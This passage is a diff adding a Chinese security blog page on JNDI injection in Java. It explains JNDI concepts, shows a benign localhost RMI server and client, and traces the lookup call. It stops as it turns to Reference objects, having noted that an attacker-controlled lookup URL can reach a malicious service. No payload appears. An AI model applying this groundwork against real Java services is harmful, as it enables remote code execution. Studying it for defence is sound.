@@ -1,0 +1,1564 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><progress id="content_progress" value="0"></progress><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pig.png">
+  <link rel="icon" href="/img/pig.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#3F4B3B">
+  <meta name="author" content="Piggy Sprint">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="JNDI注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入">
+<meta property="og:url" content="http://example.com/2026/03/08/JNDI%20%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Piggy Sprint&#39;s blog">
+<meta property="og:description" content="JNDI注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305131828261.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305130743763.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305150414080.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141156316.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141209511.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141243509.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141322455.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141610553.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141836583.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305142220421.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305145008777.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305150534686.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305151107431.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305151441693.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305151713089.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305151903969.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305152032716.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305152323608.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305152412228.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305154550091.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155046010.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155409587.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155437405.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155653132.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155802690.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305172147034.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305204438425.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305205127064.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305211539794.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305211554428.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305211920755.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305212700431.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305212858636.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305213112371.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305213731659.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305214451343.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306205913639.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306210655191.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211227245.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211305213.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211419528.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211507997.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211840230.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306153123873.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306154636751.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306200418280.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306155314172.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306193125066.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306193441903.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306193701161.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194042626.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194425552.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194533442.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194616098.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194738882.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306195057046.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306195446374.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306195948155.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306200208821.png">
+<meta property="article:published_time" content="2026-03-08T13:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-08T11:44:20.001Z">
+<meta property="article:author" content="Piggy Sprint">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="JNDI注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305131828261.gif">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>JNDI注入 - Piggy Sprint&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+
+
+  
+<link rel="stylesheet" href="/custom/LoadingBar/pace-theme-barber-shop.css">
+<link rel="stylesheet" href="/css/cloudedGlass.css">
+<link rel="stylesheet" href="/custom/ReadingProgress/ReadingProgress.css">
+<link rel="stylesheet" href="/css/Loadanimation.css">
+<link rel="stylesheet" href="/css/StrongInDark.css">
+<link rel="stylesheet" href="/css/TitleNeon.css">
+<link rel="stylesheet" href="/css/TitleGradient.css">
+<link rel="stylesheet" href="/css/ScrollBar.css">
+<link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.1.2/css/all.min.css">
+<link rel="stylesheet" href="/css/CodeBlock.css">
+<link rel="stylesheet" href="/css/CodeInLine.css">
+<link rel="stylesheet" href="/css/RandomBanner.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/Background.css">
+<link rel="stylesheet" href="/css/FrostedGlassBg.css">
+<link rel="stylesheet" href="/css/Sidebar.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":false,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+  <script src="/js/backgroundize.js"></script>
+  <script src="/js/injector.js"></script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
+<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style>
+    <style>
+    .code-expand-btn:not(.expand-done) ~ div.codeblock,
+    .code-expand-btn:not(.expand-done) ~ * div.codeblock {
+      overflow: hidden;
+      height: 360px;
+    }
+    </style>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+   <div id="bg-layer"></div>
+  <div id="loader-container"> 
+    <div id="loader" class="loader"></div>
+    <div class="loader-inner">
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/js/RainbowLoading.js" type="text/javascript"></script>
+<link href="/css/RainbowLoading.css" type="text/css" rel="stylesheet"/>
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"> 🐽🐽 Piggy Sprint &#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/random.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JNDI注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-08 21:00" pubdate>
+          2026年3月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          38 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">JNDI注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="JNDI-介绍"><a href="#JNDI-介绍" class="headerlink" title="JNDI 介绍"></a>JNDI 介绍</h1><p><strong>JNDI（Java Naming and Directory Interface）</strong> 是 Java 提供的一套用于访问命名服务和目录服务的统一接口。它允许 Java 应用通过统一的 API 与不同类型的命名或目录服务进行交互，例如 <strong>LDAP、RMI、DNS、CORBA 等</strong>。</p>
+<p>JNDI 本身并不是一个具体的服务实现，而是一个 <strong>抽象接口层</strong>。通过不同的服务提供者（Service Provider Interface，SPI），JNDI 可以访问各种后端命名服务。</p>
+<p>其基本作用类似于一种 <strong>资源查找机制</strong>：应用程序可以通过名称（Name）来查找对应的对象（Object），从而获取远程资源或服务。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305131828261.gif" srcset="/img/loading.gif" lazyload alt="A name is used to reference an object."></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305130743763.png" srcset="/img/loading.gif" lazyload alt="image-20260305130735802"></p>
+<p><strong>SPI（Service Provider Interface，服务供应接口）</strong>是 JNDI 中的一个关键组件，主要作用是为底层的具体目录服务提供统一的接入接口，从而实现目录服务的可插拔式安装。通过 SPI，不同的目录服务实现可以无缝集成到 JNDI 架构中，而无需修改应用层代码。</p>
+<p> 具体实现不同协议的访问逻辑，例如：</p>
+<ul>
+<li>RMI         Java 远程方法调用；</li>
+<li>LDAP      轻量级目录访问协议；</li>
+<li>DNS       域名服务</li>
+<li>NIS         集中管理系统配置信息的目录服务</li>
+<li>CORBA  通用对象请求代理架构，用于 COS 名称服务</li>
+</ul>
+<p>但是jdk默认支持的就是<code>RMI         LDAP       DNS       CORBA</code>  </p>
+<p><strong>命名服务（Naming Server）</strong>是一种通过名称查找实际对象的服务。例如，RMI协议可以通过名称查找并调用远程对象，DNS协议则通过域名查找对应的IP地址。这些服务都属于命名服务。</p>
+<p>在命名服务中，有几个关键概念：</p>
+<ul>
+<li><p><strong>Bindings</strong>：表示名称与对象之间的绑定关系。例如，在DNS中，域名与IP地址绑定；在RMI中，远程对象与名称绑定；在文件系统中，文件名与文件内容绑定。</p>
+</li>
+<li><p><strong>Context</strong>：上下文表示一组名称到对象的绑定关系。一个上下文可以用于查找对应的对象，例如在文件系统中，一个目录就是上下文，可以在其中查找文件，子目录也可以看作子上下文（SubContext）。</p>
+</li>
+<li><p><strong>References</strong>：对于无法直接存储的对象，它们通常通过引用的形式存储，类似于C&#x2F;C++中的指针。引用包含获取实际对象所需的信息。例如，在文件系统中，通过文件描述符（fd）来引用文件，内核使用该引用找到磁盘中的文件</p>
+</li>
+</ul>
+<p><strong>目录服务（Directory Service）</strong>是命名服务的扩展。除了名称到对象的映射，目录服务还允许对象具有属性（Attributes）。因此，目录服务不仅支持根据名称查找对象并获取其属性，还支持根据属性值进行搜索。</p>
+<p>一些常见的目录服务包括：</p>
+<ul>
+<li><strong>LDAP</strong>：轻型目录访问协议</li>
+<li><strong>Active Directory</strong>：为Windows域网络设计，提供多个目录服务，如域名服务和证书服务</li>
+<li>其他基于X.500标准实现的目录服务</li>
+</ul>
+<p>是jdk默认支持的<code>SPI</code>就是<code>RMI   LDAP   DNS   CORBA</code>  </p>
+<p>现在看rmi</p>
+<h1 id="JDNI-结合-RMI"><a href="#JDNI-结合-RMI" class="headerlink" title="JDNI 结合 RMI"></a>JDNI 结合 RMI</h1><h2 id="RMI-原生漏洞"><a href="#RMI-原生漏洞" class="headerlink" title="RMI 原生漏洞"></a>RMI 原生漏洞</h2><p>先把服务写好吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305150414080.png" srcset="/img/loading.gif" lazyload alt="image-20260305150414045"></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.Context</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.InitialContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.Reference</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Hashtable</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JNDIRMIServer</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InitialContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">initialContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InitialContext</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//创建上下文</span></span>
+<span class="line"><span style="color: #ABB2BF">         </span><span style="color: #E5C07B">initialContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">rebind</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;rmi://localhost:1099/remoteObj&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">RemoteObjImpl</span><span style="color: #ABB2BF">());</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//把地址和对象的名字创建一个远程对象，绑定到创建好的上下文上</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.InitialContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JNDIRMIClient</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InitialContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">initialContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InitialContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">IRemoteObj</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">remoteObj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (IRemoteObj) </span><span style="color: #E5C07B">initialContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">lookup</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;rmi://localhost:1099/remoteObj&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">remoteObj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">sayHello</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hello&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p>JNDI和RMI无非就是   先绑定 再访问，本质就是用的RMI</p>
+<p>只不过JNDI需要在lookup的时候自己写url</p>
+<p><strong>我们来跟一下：</strong></p>
+<ul>
+<li><p>断点打在</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141156316.png" srcset="/img/loading.gif" lazyload alt="image-20260305141156276"></p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141209511.png" srcset="/img/loading.gif" lazyload alt="image-20260305141209478"></p>
+</li>
+<li><p>再进lookup</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141243509.png" srcset="/img/loading.gif" lazyload alt="image-20260305141243473"></p>
+</li>
+<li><p>最后到了这个文件<code>RegistryContext</code>里面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141322455.png" srcset="/img/loading.gif" lazyload alt="image-20260305141322395"></p>
+<p>然后走<code>this.registry.lookup</code>就是RMI原生的lookup</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141610553.png" srcset="/img/loading.gif" lazyload alt="image-20260305141610513"></p>
+</li>
+</ul>
+<p>调用不同协议，<code>Context</code>不同，<code>RegistryContext</code>就是<code>RMI</code>的<code>Context</code></p>
+<p><strong>到这里引出来一个问题：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305141836583.png" srcset="/img/loading.gif" lazyload alt="image-20260305141836537"></p>
+<p>当<code>remoteObj</code>可控，也就是说对象可控的话，那么我们就可以通过这个url访问到恶意服务</p>
+<h2 id="JNDI-注入漏洞"><a href="#JNDI-注入漏洞" class="headerlink" title="JNDI 注入漏洞"></a>JNDI 注入漏洞</h2><p>先明白一个概念   目录存储对象（上面提到过）</p>
+<p>可存储的    对象的类型：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305142220421.png" srcset="/img/loading.gif" lazyload alt="image-20260305142220361"></p>
+<p>而我们这里说到的JNDI 注入漏洞，主要是利用的第二点   <strong>引用</strong></p>
+<p>在 Java 的 JNDI 设计中，如果一个对象无法直接序列化存储在目录服务（如 LDAP、RMI）中，可以使用 <code>javax.naming.Reference</code> 类来表示。</p>
